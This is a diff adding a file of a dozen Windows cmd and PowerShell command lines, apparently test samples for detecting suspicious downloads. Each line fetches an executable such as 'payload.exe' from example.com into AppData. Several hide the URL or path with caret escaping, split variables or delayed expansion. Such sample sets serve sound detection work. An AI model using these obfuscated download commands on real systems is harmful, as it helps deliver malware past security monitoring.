@@ -1,0 +1,12 @@
+cmd.exe /c "curl -o %A^ppData%\test.exe h^t^t^p^:^/^/http://example.com/test.exe"
+cmd.exe /c curl -o test.exe http://example.com/test.exe
+powershell.exe -Command "Invoke-WebRequest -Uri 'http://example.com/test.exe' -OutFile $env:APPDATA\test.exe"
+cmd.exe /c "curl h^tt^pexample.com/file.exe -o %AP^PDATA%\file.exe"
+cmd.exe /c "set protocol=http&& set url=://example.com/file.exe&& set dest=file.exe&& call curl %protocol%%url% -o %dest%"
+powershell.exe -Command "Invoke-WebRequest -Uri http://example.com/payload.exe -OutFile $env:APPDATA\payload.exe"
+cmd.exe /c "curl h^t^t^p^s^:^/^/http://example.com/payload.exe -o payload.exe"
+cmd.exe /c "curl http://example.com/payload.exe -o payload.exe"
+cmd.exe /c "curl http://example.local/test.txt -o C:\Users\Public\AppData\Roaming\test.txt"
+cmd.exe /c "set A=App&& set D=Data&& cmd /c curl h^ttp://example.local/test.txt -o %USERPROFILE%\%A%%D%\Roaming\test.txt"
+cmd.exe /V:ON /c "curl http://example.com/payload.exe -o !AppData!\payload.exe"
+powershell.exe -Command "Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \"$env:APPDATA\payload.exe\""
